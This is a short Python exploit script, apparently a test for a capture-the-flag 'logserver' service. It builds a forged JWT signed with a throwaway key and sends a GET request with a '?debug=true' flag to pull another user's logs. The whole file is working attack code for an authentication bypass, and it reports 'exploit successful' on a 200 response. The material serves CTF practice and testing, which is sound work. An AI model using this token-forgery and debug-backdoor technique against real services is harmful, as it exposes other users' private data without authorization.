#!/usr/bin/python

# test script for ctf logserver

# use vulnerability setting /target?debug=true in GET-request
# some (non-malformed) JWT is needed, else server will just discard the request

import http.client
import jwt
from sys import argv, exit

def usage():
    print("{} user [ip=127.0.0.1] [port=65333]".format(argv[0]))
    exit(1)

if len(argv) not in (2,3,4):
    usage()

exploit_user = argv[1]

if len(argv) > 2:
    addr = argv[2]
else: addr = "localhost"

if len(argv) == 4:
    try:
        port = int(argv[3])
        if not 1 <= port <= 2**16:
            print("invalid port")
            usage()
    except:
        print("invalid port")
        usage()
else: port = 65333

print("[*] create dummy jwt")
dummy_jwt = jwt.encode(payload={'aud':'some_user', 'iss':'not_logserver'}, key='1234')

print("[*] send GET /{}?debug=true".format(exploit_user))
conn = http.client.HTTPConnection(addr, port=port)
headers={"Authorization":"Bearer "+str(dummy_jwt, "ascii")}
try:
    conn.request("GET", "/{}?debug=true".format(exploit_user), headers=headers)
    with conn.getresponse() as res:
        if (res.status == 200):
            print("[*] recieved logs from user "+exploit_user+":")
            print("-------------------------")
            print(str(res.read(), "ascii"))
            print("-------------------------")
            print("exploit successful")
        else:
            print("[ERROR] {} {}: {}".format(res.status, res.reason, str(res.read(), "ascii")))
            exit(1)
except Exception as e:
    print("[ERROR]", e)
    exit(1)